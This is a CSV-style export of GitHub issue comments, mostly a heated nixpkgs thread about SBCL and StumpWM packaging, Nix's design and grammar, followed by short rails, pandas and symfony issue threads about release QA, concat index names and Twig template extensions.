a reality we cannot yet change. Hopefully in the future we can have enough users and dedicated maintainers to alleviate this burden from the userbase, and StumpWM and SBCL and X number of other things will just work for anyone who wants them, with no effort. If a package is broken or outdated or unmaintained (which happens with any distro), it almost always falls to a user who wishes to use that software to maintain it, I'm afraid. Have you tried asking on the  channel on freenode? I've found many helpful people there in my time who may be willing to assist you in getting a more recent SBCL and StumpWM working.  Oh, and one final thing about your 'editors note' (which I'll quote to ensure everyone can read it for the future) # Fix the tests [editor's note 'fix' the tests by removing them? fuck you.]  If you wish to behave this way, I'm afraid my impression is that your mind about how to conduct yourself in public spaces is fairly made up - and no amount of honest actors will change that behavior or attitude. I can understand frustration at using new software and being perplexed by it. But your tone in here is pretty clear. And I imagine those aren't attitudes we want anyway - besides, nothing brought you here beyond your own desires. So, if that is the case, you should find a community that does appreciate that sort of attitude - perhaps the Common Lisp community does. Or the Xbox Live community, perhaps. ",,False
nixpkgs/NixOS/4952/62661772,4952,"For worse. I would use the term ""tedious bullshit"" to describe this task, but whatever, moving on. I'm an idiot, thank you. I'll look into this now. WIP, K. curl  | grep gabriel_laddel (dolist (k '(""define remove"" ""define fix"" ""define test"") (google k))) There is nothing perplexing about Nix. A person with the handle thoughtpolice doesn't want anyone to use mean words or to be critical of a project he is involved with? Color me shocked. ... sizzle Thanks for the help. ",,False
nixpkgs/NixOS/4952/62670288,4952,"No, actually. It's because I'm a developer who works on other open source projects (several for my job), and realistically I have better things to do than deal with annoying people telling me and other people in the projects I work on to go fuck themselves - which substantially decreases my motivation to deal with said project in the first place. Indeed, my respect lies with the NixOS developers, and not you. So you'll have to forgive me if I find you annoying, but that's life sometimes. This should be pretty plainly obvious (as opposed to your quite rude assumption of my motivations and presumably willful misinterpretation of it, as if it would help your position). But apparently it needs to be spelled out to some people who seemingly incapable of understanding these aspects of social interaction and why their behaviors might be considered harmful. Which I believe are pretty clearly alluded to in my original posting. Of course, I'm not about to succumb to such belittling tactics by people like you - that would only prove such tactics work to drive people away, ultimately harming everyone. So I'm afraid the feared Orwellian Thought Police of NixOS™ is here to stay -- much to your great despair, I imagine. Be afraid - be very afraid!  That said, this bug is a bit convoluted. Really there are several things going on here, based on your original description 1) The emacs package is missing several things, including - Infopages are not built by default. - PDF/postscript viewing doesn't work.  2) Dependencies for Emacs are unclear, although as I explained before, we should have all of these readily available. They merely follow different conventions for naming/meta-packaging. If something is missing, it can certainly be upstreamed. 3) SBCL tests should not be nerfed; furthermore they should likely be integrated into the build process on Hydra, so ever. How/if this can be fixed depends on the upstream project and the tests in question; while many projects do enable tests (by specifying  in their ), this isn't always easily doable in some cases. I'm afraid I don't know much about the specific tests in question here to comment. 4) SBCL dynamic dependencies/cffi libraries need to be properly managed in some way. There are a slew of other packages that manage their own subpackages in a similar way; Emacs is one of them, in fact. Another is OCaml or the Haskell package set. In short, we tend to write environment wrappers which properly 'set up' the environment for a specific package. For example, when we use GCC and specify a library like  in the  of an executable, this actually is translated into a set of paths in which GCC will look for libraries - this way,  directives properly work, as well as flags like . These paths are actually provided via environment variables - and GCC is actually a shell script that wraps the real GCC in with the proper flags. This explains why we have packages like  or whatnot. We would probably equally need something like an  tool, that when invoked will properly set up an environment in which the real SBCL executable will be able to  the right libraries (assuming of course there's some flag/option to control the base directory of where the  occurs and where SBCL searches for shared objects in the first place). Then, individual SBCL packages would go into their own namespace, such as , where people could select the sub libraries they want. We have quite a few toolchains that follow this exact scenario. 5) StumpWM and SBCL are outdated it seems, and could do with a working update. Really though, these are all separate issues in a way, so I would suggest you file them each in a ticket so they can be triaged and more easily tracked by developers. Having a meta-ticket is fine in general AFAIK (maybe 'overhaul SBCL support' which most of the issues would fall under), although keeping separate issues for the separate subtasks makes it easier to manage them and address individual concerns. Of course, I'm not going to do this for you, but I'd suggest that it's probably the easiest way to at least have your complaints looked at (as opposed to posting a very long Emacs buffer - the syntax highlighting actually makes it rather painful to read). Don't worry about it - although you won't be getting any from me in the future. Although I will certainly return and be sure to call you out on shitty behavior should I see it. After all, what kind of Thought Police™ would I be if I didn't? I'd be letting you down, what with the expectations you set for me! ",,False
nixpkgs/NixOS/4952/62671091,4952,"This issue is fascinating, I've never seen a bug report written in LISP before. I'm also a little perplexed by the general tone and sense of entitlement but anyway... I'd like to address some of your points @friend . I see that you try to build EMACS from the command line. That's not how it is done in NixOS as that's not repeatable and stateful. Either you clone nixpkgs and change the nix expressions already there, or you use the packageOverrides in your  (see  asked 1 question on #nixos and then logged off when you got no replies? Perhaps the nix-dev mailing list would be more suited to your IRC style. I general I would say there is a passion for code quality and statelessness in NixOS, just go look at all the comments on issues asking to change this or that. You seem to have gotten the reverse impression from the learning curve and EMACS. Nothing I can do about that, just interesting. If you like the Nix concepts you could implement StumpWM the way you like it, or you could just walk away. I don't know what causes your SBCL error. The guys in the LISP channel are correct, when you build something for Nix you fix all inputs, and if something doesn't work like that you wrap it so it only sees the part of the world that you want. Oh, those sb-posix test failures are also perplexing. Expecting 13, getting /? Wow. Of course, just turning them off was not the right thing to do. Anyway. ",,False
nixpkgs/NixOS/4952/62671369,4952,Oh and hats off to @friend for his detailed and gracious answers. ,,False
nixpkgs/NixOS/4952/62672092,4952,"Oh, and I will leave one mention about the IRC channel I am not sure in what timezone the OP resides, but realistically from my time contributing I've noticed NixOS has a very large European userbase and a much smaller ""not European"" userbase. Given the assumption the logs are timestamped to a European timezone, it's perhaps not surprising most people weren't available in the early morning hours. So knowing nothing about OP, I imagine this could possibly have some impact on the availability of people to respond. As an American myself, this too has caught me off guard. So yes, the  mailing list may actually be a better place to formulate longer discussions, depending on your availability. ",,False
nixpkgs/NixOS/4952/62673641,4952,"Also, currently NixPkgs has a working StumpWM 0.9.8 package (previous release) compiled using SBCL-1.2.5 (which is also in NixPkgs). Some of SBCL tests make assumptions about the base system;  the others are run during the SBCL build  (look for ACLREPL-TESTS) ",,False
nixpkgs/NixOS/4952/62874698,4952,"@friend There's an SDF representation of the syntax in @friend's PHD thesis starting on page 64, though I'm not sure if that would be entirely up to date. It also can be seen as acting as a design document, and lays out the thought and central metaphors behind Nix/OS pretty clearly. ",,False
nixpkgs/NixOS/4952/62895128,4952,"@friend actually, you could say that  (Bison configuration) is a very strict, machine-readable BNF form... I wonder if there's a tool that takes Bison input and generates a human-readable grammar. ",,False
nixpkgs/NixOS/4952/63006110,4952,I've seen everyone's responses and will be responding in due time. ,,False
nixpkgs/NixOS/4952/63131177,4952,"Relevant, apparently you can get an almost-BNF out of bison with  ",,False
nixpkgs/NixOS/4952/65074661,4952,"FWIW, here's the grammar. The tokens are defined in  $accept start $end  1 start expr  2 expr expr_function  3 expr_function ID '' expr_function 4              | '{' formals '}' '' expr_function 5              | '{' formals '}' '@' ID '' expr_function 6              | ID '@' '{' formals '}' '' expr_function 7              | ASSERT expr ';' expr_function 8              | WITH expr ';' expr_function 9              | LET binds IN expr_function 10              | expr_if  11 expr_if IF expr THEN expr ELSE expr 12        | expr_op  13 expr_op '!' expr_op 14        | '-' expr_op 15        | expr_op EQ expr_op 16        | expr_op NEQ expr_op 17        | expr_op '&lt;' expr_op 18        | expr_op LEQ expr_op 19        | expr_op '&gt;' expr_op 20        | expr_op GEQ expr_op 21        | expr_op AND expr_op 22        | expr_op OR expr_op 23        | expr_op IMPL expr_op 24        | expr_op UPDATE expr_op 25        | expr_op '?' attrpath 26        | expr_op '+' expr_op 27        | expr_op '-' expr_op 28        | expr_op '*' expr_op 29        | expr_op '/' expr_op 30        | expr_op CONCAT expr_op 31        | expr_app  32 expr_app expr_app expr_select 33         | expr_select  34 expr_select expr_simple '.' attrpath 35            | expr_simple '.' attrpath OR_KW expr_select 36            | expr_simple OR_KW 37            | expr_simple  38 expr_simple ID 39            | INT 40            | '""' string_parts '""' 41            | IND_STRING_OPEN ind_string_parts IND_STRING_CLOSE 42            | PATH 43            | SPATH 44            | URI 45            | '(' expr ')' 46            | LET '{' binds '}' 47            | REC '{' binds '}' 48            | '{' binds '}' 49            | '[' expr_list ']'  50 string_parts STR 51             | string_parts_interpolated 52             | %empty  53 string_parts_interpolated string_parts_interpolated STR 54                          | string_parts_interpolated DOLLAR_CURLY expr '}' 55                          | STR DOLLAR_CURLY expr '}' 56                          | DOLLAR_CURLY expr '}'  57 ind_string_parts ind_string_parts IND_STR 58                 | ind_string_parts DOLLAR_CURLY expr '}' 59                 | %empty  60 binds binds attrpath '=' expr ';' 61      | binds INHERIT attrs ';' 62      | binds INHERIT '(' expr ')' attrs ';' 63      | %empty  64 attrs attrs attr 65      | attrs string_attr 66      | %empty  67 attrpath attrpath '.' attr 68         | attrpath '.' string_attr 69         | attr 70         | string_attr  71 attr ID 72     | OR_KW  73 string_attr '""' string_parts '""' 74            | DOLLAR_CURLY expr '}'  75 expr_list expr_list expr_select 76          | %empty  77 formals formal ',' formals 78        | formal 79        | %empty 80        | ELLIPSIS  81 formal ID 82       | ID '?' expr  ",,False
nixpkgs/NixOS/4952/70743024,4952,"There has been no activity for a couple of weeks, so I'll close the issue. If there are actionable items hidden in this thread somewhere, I guess it would be better to create separate, new tickets for those. ",,False
nixpkgs/NixOS/4952/70775570,4952,I'll note that I've drafted up my response to all unanswered messages but am busy and don't know when I'll have time to finish it off. Closing the issue is fine with me. ,,False
nixpkgs/NixOS/4952/70809334,4952,@friend just paste your draft? Otherwise you'll never come back to it... ,,False
nixpkgs/NixOS/4952/70896941,4952,I don't publish drafts. I'm in the middle of something at the moment and will respond over the weekend. ,,False
nixpkgs/NixOS/4952/70899963,4952,-) reminds me of classical Cathedral vs. Bazaar dilemma. ,,False
nixpkgs/NixOS/4952/71556033,4952,Wasn't able to finish over the weekend and am busy for the next two days. Best guess is wed/thurs. ,,False
nixpkgs/NixOS/4952/73421969,4952,"Note1 I've read NixOS A Purely Functional Linux Distribution and Nix A Safe and Policy-Free System for Software Devlopment, but not the associated PHD thesis. The contents listing didn't indicate that it'd introduce me to any new ideas. Note2 I've ignored forth and apl derivatives in this comment. Anyone familiar with will understand why upon reading it. Fundamentally, package management is composed of graph traversals and transformations. The goal that separates NixOS from other package managers, reproducible builds, can be rendered as ""the ability to save and restore unix's dependency graph"". This is a neat idea, but the implementation merely trades one set of problems for another. Many crucial design decisions that should have been throughly discussed were completely ignored. For example, nowhere in the design documents is it stated that every(?) programming language already has its own package manager(s) with its own idiosyncrasies that for the most part don't share concepts or code with the others. There are many good questions that originate from this fact, were one to acknowledge it. Examples at what point is appropriate to leave package management up to a language's ecosystem? Is there ever a reason to? Can maintainers be convinced that the 'nixos way' is a good one and that packaging their code with a flag of some sort that produces a nix friendly build script is a reasonable request? Are we confident enough in nix to spend their time? Given that the NixOS plan is to modify build scripts and sources to its liking, what is the proper way to go about doing source-to-source transformations? Are there commercial offerings that solve this problem? The undiscussion of these issues is prototypical of the Nix design documents and documentation. From NixOS A Purely Functional Linux Distribution, How exactly does the reference scanner detect runtime dependencies? Regex and sed hackery? Or the correct way, parsing each language into its abstract syntax tree (ast), walking that and finding references to unix level dependencies (both static and dynamic)? I assume the former, as the latter is a great deal of work and would have been mentioned. Also, the only complete C99 parser (i.e., one that takes into account all the GCC extensions used in the linux kernel) I'm aware of is the haskell package Language.C.AST - and nix doesn't use haskell. The problem with anything other than traversing a language's ast is that you're forever stuck with an approximation of the input language, resulting in false positives etc. This is not new information. Notice that the paper says, but fails to mention how many people used NixOS over those 5 years, how many times undeclared build time dependencies /outside/ of the Nix store were encountered or how many packages were in the Nix store over this time period. Is this not relevant information? As Naggum stated above ""the rub with these 90% solutions is that you have /no/ idea when they return the wrong value becuase the approximation destroys any ability to determine correctness."" If say, most of the NixOS users are NixOS developers (which they are) and the reference scanner doesn't walk the ast of the programs in question (which it doesn't), no reported failures means exactly nothing, because there will be many code paths not encountered by its users due to the sheer complexity of the software being interfaced with (e.g., how many NixOS +developers+ users use emacs docview? Not many apparently). There are other issues with these papers I'm going to skip over, such as the clearing of environment variables (the proper thing to do imo is to gensym them to prevent unwanted interactions and study how they're being used - filter for 'functional' builds...), failure to discuss why a new project is needed in the first place (why can't you just perform this computation via an extension to an existing project?), total wtf issues with the papers (who are they written for? One who needs the concept of ""file system"" explained is going to have nfi what emacs lisp or ~/what/all/the/slashes/signify) etc. The heart of the matter is that unix (ostensibly[0]) plays host to many different philosophies of how to go about programming. Languages differ in their approach to build systems, package management, syntax and foreign function interfaces. To change the way many software packages are built in a semi-automated, non-ast-walking fashion is insane. Not to discuss this in the design documents is insane. NixOS has 46 contributors and the documentation is sufficiently general as to give each contributor his own wildly different interpretation of the scope of the project. As far as I can tell, were one to extrapolate from the given information to a set of concrete requirements we see that NixOS plans to rewrite the build scripts for every version of every project on unix. Again, this is insane. The correct thing to do in this situation is to realize the utter impossibility of the task that has been set forth and re-evaluate one's approach.[1] Let's examine the reference scanner. What is the correct way to approach the problem? We know regular expressions cannot respect the semantics of a language and thus are (unless used as a part of a larger parser) inappropriate for meta-programming (source-to-source transformations). Thus, we must work by manipulating the ast of various languages, and then pretty printing the altered code into the language's concrete syntax. Most languages don't offer the ability to do this, and one examines into e.g., Clang, he will see all sorts of nonsense about concrete/surface syntax, context free grammars and compiler technologies. This certainly can't all be necessary (hint it isn't). Consider the following mathematical expression (3 + 2)  8 / 3  3^6 Fully parenthesizing yields (((3 + 2)  8) / (3  3^6)) When computers execute programs, or humans mathematics, the order of operations must be taken into account. one way to notate the previous expression to remove such ambiguities present in mathematical notation is to move operators to the front of each parenthesized list, passing the remaining elements as its arguments. This is known as fully-parenthesized prefix notation. (/ ( (+ 3 2) 8) ( 3 (^ 3 6))) This notational scheme has a direct mapping to the program's ast, which can be rendered as  the pattern? An s-expression (fully parenthesized prefix notation) is merely a serialization for the ast. Thus,  manipulations of the sexpr correspond to manipulations of the ast. Languages with the vocabulary to manipulate the s-expression structure can manipulate themselves (their ast) just as easily as any other thusly structured information. It follows from this that all software 'tooling' and translation tasks, transparently become trees e.g., find me all things that call this function, reference this variable, modify all build scripts to take into account the new &amp;optional argument in the updated library, etc. are viewed quite transparently (and correctly) as tree traversals.[2] For whatever reason, many find s-expressions distasteful and spend much of their lives attempting to add the same meta-programming facilities to ALGOL derived languages. They all have failed. Not because of any sort of mechanical failing of the computer, but the human's inability to fully comprehend the parsing and syntactical schemes they're able to create (Ruby's parser is 10k lines of C, Clang's is &gt;100k loc. Note that the entirety of SBCL is ~300k loc, and has much fat that could be trimmed off -  is a notable failure in this regard. Watch this video  attention to 3739-4250 and you'll get to see Paul Phillips flipping out over ir/asts (same thing!). He even states his plan for the next 25 years - attempt to solve a problem solved 50+ years ago ( particular, I found these quotes quite pertinent. ""I want to programmatically generate asts and feed those"" ""Even though this is what everybody does it's kinda nuts, why is the canonical code representation a STRING?!"" (not everyone does this, just algol derivatives) ""The ast is going to be designed along side the VM"" ""I need a tight feedback loop on the thing that I'm working on right now"" Wait, like every common lisp compiler ever? 30+ years behind the times yo. ""the code that you look at, that ought to be a reflection of the AST. The canonical thing ought to be the tree, the code is a view of it.... It's trees that are fundamental, that's what we work with"" Lol. Gotcha. ""something not offered by our tremendously entangled compiler, which doesn't even have a clean parse tree. It's comical. Try to get back to the source from what you get out of the scala parser. To me, the minimum test of a parser is that it parses!"" Lol. 'Comical' is definitely the right word. ""modifiability is paramount. If it isn't straightforward to modify, it will never be any good. It will never be fast. It will never be correct. And it will eventually be replaced by something modifiable... after consuming as many hours as you feed it."" Again, 30+ yrs behind the times[3]  what does all this have to do with NixOS? Much of the complexity in NixOS originates in the failure to address why it isn't a trivial modification on an existing project. Were they to have honestly sized up the problem they'd end up at something like people suck at both reading &amp; programming, also asts are fundamental. They'd then realize that at some point you have to choose some languages and leave others, because not everyone has something to offer and writing fully compliant parsers for all the languages involved is about as entertaining as building pyramids. When one has decided on a particular scheme, one could set about implementing ""the ability to save and restore parts of unix's dependency graph"". But by failing to address this complexity NixOS inherits it, and in practice, adds to it by the 'invention' of /yet another/ language created for no particular reason. 800+ existing languages[4] and /none of them/ have the required properties? Nonsense. Allow me to anticipate your retorts ""I need to know that my nix code is functional"" +BEGIN_SRC common lisp ;; let's assume, for the sake of argument that you only want the symbols ;; design-antipattern', `the-type-gods-will-save-me' plus ;; strings to occur in your 'language' in addition to strings and keywords. You ;; know that the functions these symbols describe are functional and thus, a ;; valid program is functional. ;; ;; here is how you validate a 'nix' ast. (defun flatten (tree)   ""Traverses the tree in order, collecting non-null leaves into a list.""   (let (list)     (labels ((traverse (subtree)                (when subtree                  (if (consp subtree)                      (progn                        (traverse (car subtree))                        (traverse (cdr subtree)))                      (push subtree list)))))       (traverse tree))     (nreverse list))) (defvar myast '(functional-lol (design-antipattern ""death"")                                 (the-type-gods-wont-save-me ""destruction and chaos! also, bunnies""))) (defun validate (ast)   (every (lambda (k) (or (keywordp k) (and (symbolp k)              (member k '(functional-lol design-antipattern the-type-gods-will-save-me) test 'eq))              (stringp k)))      (flatten ast))) (validate myast) ; =&gt; nil If you like the Nix concepts you could implement StumpWM the way you like it, or you could just walk away. I'm also a little perplexed by the general tone and sense of entitlement but anyway... I'd like to address some of your points @friend . There's an SDF representation of the syntax in @friend's PHD thesis starting on page 64, though I'm not sure if that would be entirely up to date. It also can be seen as acting as a design document, and lays out the thought and central metaphors behind Nix/OS pretty clearly. -) reminds me of classical Cathedral vs. Bazaar dilemma. The process of constructing instruction tables should be very fascinating. There need be no real danger of it ever becoming a drudge, for any processes that are quite mechanical may be turned over to the machine itself. -- Turing, A. M., 1946, Proposed electronic calculator, report for National Physical Laboratory, Teddington for the present-day darkness in the programmer's world the programmers themselves are responsible and nobody else. -- Dijkstra Suppose you're trying to find the best way to structure your description of something.  (Examples  choosing the structure for a computer program to perform some task; or choosing the structure for a theory of physics.) What you hope to find is the natural structure of what you're describing — a structure that affords a really beautiful, simple description.  When you strike the natural structure, a sort of resonance occurs, in which various subsidiary problems you may have had with your description just melt away, and the description practically writes itself. But here's a problem that often occurs  You've got a structure that affords a pleasing approximate description.  But as you try to tweak the description for greater precision, instead of the description getting simpler, as it should if you were really fine-tuning near the natural structure, instead the description gets more and more complicated.  What has happened, I suggest, is that you've got a local optimum in solution space, instead of the global optimum of the natural structure  small changes in the structure won't work as well as the earlier approximation, and may not work at all, so fundamental improvement would require a large change to the structure. --  is a simple and elegant answer to this question Just learn Common Lisp well first.  New languages are exciting to people who know mostly new languages, so learn an old language before you learn new ones and get out of the maelstrom that will drown you in ever new languages that add nothing at all except some miniscule additional feature from another language that someone needed to make a whole new language to implement because he did not know (Common) Lisp to begin with.  A ""new"" language that differs from the rest of the crop by one or a couple features is proof positive that both what it came from and what it has become are mutations about to die.  There are tens if not hundreds of thousands of such ""languages"" that people have invented over the yeare, for all sorts of weird purposes where they just could not use whatever language they were already using, could not extend it, and could not fathom how to modify its tools without making a whole new language.  They never stopped to think about how horribly wasteful this is, they just went on to create yet another language called Dodo, the Titanic, Edsel, Kyoto-agreement... -- Erik Naggum,  This could be largely automated, but that is a discussion for another day. ",,False
nixpkgs/NixOS/4952/73422170,4952,"Note1 I've read NixOS A Purely Functional Linux Distribution and Nix A Safe and Policy-Free System for Software Devlopment, but not the associated PHD thesis. The contents listing didn't indicate that it'd introduce me to any new ideas. Note2 I've ignored forth and apl derivatives in this comment. Anyone familiar with will understand why upon reading it. Note3 I posted and deleted this approximately ~5min ago - sorry, the using  common lisp ;; let's assume, for the sake of argument that you only want the symbols ;; design-antipattern', `the-type-gods-will-save-me' plus ;; strings to occur in your 'language' in addition to strings and keywords. You ;; know that the functions these symbols describe are functional and thus, a ;; valid program is functional. ;; ;; here is how you validate a 'nix' ast. (defun flatten (tree)   ""Traverses the tree in order, collecting non-null leaves into a list.""   (let (list)     (labels ((traverse (subtree)                (when subtree                  (if (consp subtree)                      (progn                        (traverse (car subtree))                        (traverse (cdr subtree)))                      (push subtree list)))))       (traverse tree))     (nreverse list))) (defvar myast '(functional-lol (design-antipattern ""death"")                                 (the-type-gods-wont-save-me ""destruction and chaos! also, bunnies""))) (defun validate (ast)   (every (lambda (k) (or (keywordp k) (and (symbolp k)              (member k '(functional-lol design-antipattern the-type-gods-will-save-me) test 'eq))              (stringp k)))      (flatten ast))) (validate myast) ; =&gt; nil ♠ ""I don't want to require a whole compiler!"" By failing to make use of existing programs NixOS not only adds a language (compiler/interpreter), but the requirement for an Emacs mode (plus one more for every other editor!), custom syntax highlighting, extra crap for auto-completion etc. etc. One should instead make use of what already exists. As it stands SLOCCOUNT reports 26.3k loc, divided across 7 languages being are used to introduce another for the nix project. This number of languages alone is enough to guarantee that no one will ever understand the whole codebase on a rolling basis and have enough time to do much else with their life. A preceptable analogy to the natural languages springs forth if we created them for the same reason so-called professional programmers create programming languages, each new subculture would require a whole new alphabet/glyph scheme, phonetic system, grammatical structures etc. Though some surface features may be shared across languages, the underlying semantics they represent would change in unpredictable and often incompatible ways.[5] ""So, you want us to write lisp? What if something better comes along?"" You are faced with a choice - either learn from those who came before you, or spend the rest of your life fighting monstrosities of your own creation, attempting to eke out some order in all the chaos, be it the SDF/BNF format of a language's syntax or otherwise. In any case, if something better comes along, transforming your s-expression code into &lt;powerful new notation&gt; will be a straightforwards intern-level task[6]. Now to address some unanswered questions. You don't say. You're in Mexico city and ask a bystander to direct you to the airport (your phone died, you lack a map and you're going to miss your plane unless you make it to the airport soon). He gives very specific instructions, which you write down and follow exactly. You reach the last instruction somewhere near the slums, missing your flight. As such, you swear loudly. Is anyone entitled to correct directions? Of course not. I however, expect the /bare minimum/ of people giving correct directions and accurate descriptions of their projects, much like I expect my friends to brush their teeth regularly. If I say ""jump in front of the bus on my mark, ready? 1, 2, 3 - JUMP!"" it is clear what I'm asking/ordering, what is less clear is why I'd be asking/ordering someone to jump in front of a bus. There are very few classics in the field of computing. We are at the very beginning of this journey and it hasn't even begun to get interesting yet. IMHO, the Cathedral vs. Bazaar isn't in anyway a dilemma or a classic. Linux was a failure 20 years ago, it is a failure today and any posturing otherwise is just that. See The UNIX-HATERS Handbook[0] for more information. I find the contrast between these quotes accurately depicts the computing situation circa 2015.  Footnotes  [0] In actuality unix is mostly a pile of stupid, see web.mit.edu/~simsong/www/ugh.pdf [1] [2] This scheme the surrounding ideas are so fundamental that they've sometime's referred to as ""Maxwell's equations of Software"". You can read more about Lisp and s-expressions elsewhere so I'll not repeat it here.  This information re, Scala is interesting beyond the technicalities. Typesafe, the Scala company (has Martin Odersky as Chairman and Chief Scientist) has received 31 MM in funding. Coursera (who built everything in Scala) has received 85MM. I'll predict they'll eventually fail as they're out-competed by more intelligent adversaries, though both will (due the amount of funding and high-profile people involved, probably limp along for years to come). Last I checked, Coursera already had fungus growing on it something about, ""usg-sponsored studies find that coursera is better than starving in Africa"" [4]  corresponding lisp narrative feels 'organic'. Consider the SBCL (steel bank common lisp) compiler. It is descended from CMUCL python compiler and uses some of its code, changing it as circumstances require (and of course, any transformations that needed automation were but a tree traversal away). Naggum also had some related thoughts [6] This could be largely automated, but that is a discussion for another day. ",,False
nixpkgs/NixOS/4952/73492960,4952,"Holy wall of text @friend! I understand that you fully wanted to underline your points but I would have been happy with  you didn't take existing source package management like CPAN into account 10 years ago you just scan for strings in the build output so you can not be 100% sure that the dependency graph is correct you invented Nix instead of using something like LISP  Those are your points right, or am I misunderstanding them/missing some? Package management was indeed not built in from the beginning. The current approach is to convert instructions to npm and friends into nix package specifications. AFAIK this is in place for Haskell, Ruby, NodeJS, Python, Go and maybe Perl, not sure. This works okay but still has problems when semantics clash. The build flow is something like ""generate nix expressions for dependencies, store in nixpkgs tree next to package and create nix expression for the package"". Because of idempotency it doesn't matter if dependencies are mentioned many times, if they result in the same inputs hash they will be reused. You can think of this as a very lazy static evaluation of needed packages out of hundreds of thousands of third-party packages. Considering the alternative of putting Nix expressions in other package management systems, I think this works pretty well. Regarding the hash checking, the observation of no problems with it still stands. Dependency detection is quite robust and has low impact if incorrect.  False positives (a dependency is falsely detected) can only be due to spurious unused references (it happens and we fix it if found), or 32+ byte ascii strings (hash+package name/version) occurring by chance in compiled code (extremely unlikely) False negatives (a dependency is not detected) can happen if the references are not stored in plain text, due to compression or encoding. I don't know of this happening in any of nixpkgs. The impact of incorrect dependencies is either increasing closure size, or missing dependencies when garbage collecting or installing a package from binary. The former is hardly problematic, the latter hasn't happened yet afaik, despite automatic GC running on many production systems.  So yes, both those things are only 99.9% solutions, but they are gaining 9s each year. The 100% solution seems infeasible to me in both cases. For the last point, I think  the issues nicely. Personally I prefer the advantages Nix gives over what Guix gets via Scheme. Thank you for posting your thoughts, I still believe that NixOS and ecosystem are awesome and in a good position going forward. On Sun Feb 08 2015 at 65159 PM Gabriel Laddel notifications@friend.com wrote ",,False
nixpkgs/NixOS/4952/73659446,4952,"Uh... yeah, that's totally all the points I made. Toodles. ",,False
nixpkgs/NixOS/4952/120447628,4952,"NB I'm a Lisp guy who uses and likes NixOS, but isn't a big expert in NixOS. Minor remarks uioprun-program has a now reliably portable directory clause. If you only care about Unix, then you can use ; to separate commands in a single string. (If you want to support windows, &amp; might work, but not all implementations can successfully use CMD.EXE on Windows, and /bin/sh isn't reliably present.) NixOS isn't perfect, but is accepting patches. If you're interested in static linking of libfixposix into sbcl images, I have recipes that need to be put together into actual code, that you may be interested in. If you want a NixOS package with dynamic linking the solution is to either enhance cffi so you can statically specify the search path, or have a wrapper that initializes the search environment around the binary. Also, the solution to false negatives is that a package breaks if it's missing a dependency, so whoever is writing the package specification will notice and fix it — and thereafter it will build deterministically. ",,False
nixpkgs/NixOS/4952/120449383,4952,"Thanks for the info Francois. FTR, NixOS is fundamentally braindamaged. I found it was easier to create my own distribution than to hack around their crud. Details here  Fri, Jul 10, 2015 at 411 PM, François-René Rideau  notifications@friend.com wrote ",,False
nixpkgs/NixOS/4952/269128206,4952,"Are… are you advertising in issues of unrelated projects? On Sat, Dec 24, 2016, 937 PM Gabriel Laddel notifications@friend.com wrote ",,False
rails/rails/33517/346979232,33517,"Do you have rules before releasing a new version of ruby/rails, for example ""no more than x bugs"" or ""no critical bugs"" or so? Can I read them somewhere? If you do not have such rules, do you need some help setting up this quality assurance stuff - I could help with that if you like. I think it's more important to publish something stable instead of something fast. ",,False
rails/rails/33517/409903816,33517,"We publish release candidates before any release to catch any regressions as soon as possible. E.g. for the coming 5.2.1, we've just released rc1  is always appreciated, but I don't think we need any for the process setup here. Thanks! ",,False
rails/rails/33517/409918202,33517,Where can i see details about your regression tests? ,,False
rails/rails/33517/409926626,33517,"You can see our test matrix in Travis CI here  notice that there are very few tests that are run on JRuby, and even those are marked as ""allowed failures"". Latest Rails is not currently expected to run on JRuby, and while improving that would be nice, it's not a release blocker. The JRuby team are doing great work, within their available time, to bridge that gap -- and once it works, we'll prioritise keeping it working -- but until then, the problem is that JRuby isn't acting enough like Real Ruby; we can't fix that. If you want to see Rails running on JRuby, I'd suggest speaking to the JRuby and/or activerecord-jdbc-adapter teams they'll have a much better idea of which Rails version they have the best support for at the moment. ",,False
rails/rails/33517/409960962,33517,"a) Why do you not try to code as compatible as possible to jruby?  b) Do you have any release strategies for QA I can read? As mentioned before , something like ""no release if x bugs left"" or ""no release if critical bugs available"" or so? c) I work in my free time on similar things, too (others) and I know that no one can expect anything, I have only positive impulses and good ideas, a mental attitude to bring things positive forward. d) Quality for a framework is more important than the next release with n bugs left. The best mix for that can be calculated with a nash equilibrium formula. ",,False
rails/rails/33517/409961480,33517,"I do not understand why you not try to be compatible to the java world, your rails apps could work on apache tomcat or many government contractors allow only java bytecode. ",,False
pandas/pandas-dev/13475/160946165,13475,"xref #13742 for addl cases. So the issue seems to be with a string index that is not equal, as when the index of the two frames is equal (no NaNs are introduced), the name is kept and also when using numerical indexes, see  I use the concat function with input dataframes that have index.name assigned, sometimes the resulting dataframe has the index.name assigned, sometimes it does not. I ran the code below from the python interpreter, using a conda environment with pandas-0.18.1 I don't see any odd / extra characters around the ""pert_well"" column in the files between the files. Code Sample, a copy-pastable example if possible results Expected Output c.index.name should be ""pert_well"" output of pd.show_versions() INSTALLED VERSIONS commit None python 2.7.11.final.0 python-bits 64 OS Linux OS-release 2.6.32-573.7.1.el6.x86_64 machine x86_64 processor x86_64 byteorder little LC_ALL None LANG C pandas 0.18.1 nose None pip 8.1.2 setuptools 23.0.0 Cython None numpy 1.11.0 scipy None statsmodels None xarray None IPython None sphinx None patsy None dateutil 2.5.3 pytz 2016.4 blosc None bottleneck None tables None numexpr None matplotlib None openpyxl None xlrd None xlwt None xlsxwriter None lxml None bs4 None html5lib None httplib2 None apiclient None sqlalchemy None pymysql None psycopg2 None jinja2 None boto None pandas_datareader None PMEL_input_files_for_pandas_issue.zip ",,False
pandas/pandas-dev/13475/502354307,13475,experiencing the same bug on pandas 0.24.2 ,,False
symfony/symfony/3150/2884438,3150,"Unable to find template ""global_right.html"" expected to work, but fails     {% include 'global_right.html' %}    expected to work, but fails     {% include 'global_right.html' %}    this works finally     {% include 'global_right.html.twig' %}    - I assume that this is because of how Symfony2 integrates twig, because twig documentations documents an expeted behaviour  should not enforce the .twig extension - or at least, the error messages should be more concise. ",,False
symfony/symfony/3150/3548336,3150,This is because Sf2 supports multiple engines (and this is not related to Twig itself) The templating engine to use is selected by the last part i.e. ,,False
symfony/symfony/3150/3548420,3150,"@friend the include tag expect a template name. When using Twig standalone, the template name is generally directly the file name (and so can be virtually anything). The loader used in Symfony2 enforces a specific format to integrate templating with the bundle structure ",,False
symfony/symfony/3150/3548689,3150,"@friend ""The loader used in Symfony2 enforces...""  That's the point. It should not force me to avoid the most natural thing within development inclusions. And if it does so, then it must bring up more concise error messages. It says ""Unable to find template""  which is missleading (if not wrong, the template is there). It should say ""File not allowed, twig is configured to load only ... ...! Try this and that, or change configuration in ... ""  Can I change the configuration somewhere, thus I can include a simple ""MyTrivial.html"", too? ",,False
